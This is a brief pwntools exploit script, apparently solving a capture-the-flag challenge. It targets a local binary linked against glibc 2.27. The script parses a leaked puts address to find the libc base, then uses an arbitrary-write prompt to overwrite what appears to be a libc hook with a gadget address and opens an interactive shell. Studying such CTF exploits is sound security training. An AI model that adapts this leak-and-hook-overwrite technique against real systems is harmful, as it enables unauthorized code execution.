from pwn import *
p=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./write'],env={"LD_PRELOAD":"./libc-2.27.so"})
libc=ELF('./libc-2.27.so')

def read_prompt():
    return p.recvuntil('uit\n')

prompt = read_prompt()
m = re.search('puts: 0x([a-f0-9]*)', prompt).group(1)
libc_base = int(m, 16) - 0x809c0

def a(x):
    return libc_base + x

def w(key, value):
    write_key = a(key)
    write_value = a(value)
    p.sendline('w')
    print(write_key, write_value)
    p.sendline(str(write_key))
    p.sendline(str(write_value))

w(0x3ecd80, 0x3ecd70)
prompt = read_prompt()
print(prompt)

w(0x3ed8e8, 0x10a38c)
prompt = read_prompt()
p.sendline('q')
p.interactive()
